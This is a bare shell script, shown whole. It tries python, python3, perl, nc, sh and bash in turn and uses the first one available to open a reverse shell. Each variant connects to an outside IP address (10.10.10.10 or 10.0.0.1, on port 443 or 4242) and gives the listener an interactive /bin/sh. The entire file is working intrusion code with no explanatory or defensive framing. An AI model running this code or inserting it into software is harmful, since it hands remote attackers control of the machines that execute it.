if command -v python > /dev/null 2>&1; then 
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.10.10",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi
if command -v python3 >  /dev/null 2>&1; then 
	python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.10.10",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi
if command -v perl >  /dev/null 2>&1; then 
	perl -e'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi
if command -v nc >  /dev/null 2>&1; then
	rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
	exit;
fi
if command -v sh >  /dev/null 2>&1; then
	/bin/sh -i >&/dev/tcp/10.0.0.1/443 0>&1
	exit;
fi
if command -v bash >  /dev/null 2>&1; then
	bash -i >&/dev/tcp/10.0.0.1/4242 0>&1
	exit;
fi
